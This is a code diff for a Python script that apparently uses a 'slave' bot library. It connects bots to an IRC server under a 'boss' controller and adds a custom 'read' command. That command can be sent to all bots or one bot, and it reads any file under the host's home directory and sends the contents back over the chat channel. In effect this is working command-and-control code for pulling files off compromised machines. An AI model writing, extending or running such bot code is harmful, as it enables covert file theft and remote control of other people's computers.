@@ -1,4 +1,5 @@
-from slave.lib.bots import BotV2
+from slave.lib.bots import BotBasic, BotV2
+from pathlib import Path
 
 config = {
     'host': 'chat.freenode.net',
@@ -7,9 +8,14 @@ config = {
     'boss_name': 'boss666',
     'bot_prefix': "SLAVEBOT"
 }
-BotV2.read_config_from_dict(config)
+BotBasic.read_config_from_dict(config)
+BotBasic.bot_type = "MyCustomBot"
 
-## Write custom commands here
-
-
-BotV2.start()
+@BotBasic.register('read', all=True, on_connect=False, help_text="Read from file $read [/all | <bot_id>] <file_name>")
+def read_file(bot, args):
+    path = str(Path(f"~/{args[1]}").expanduser())
+    with open(path, 'r') as f:
+        bot.send_text(f.read())
+    
+BotBasic.use_other_bot_commands(BotV2)
+BotBasic.start()
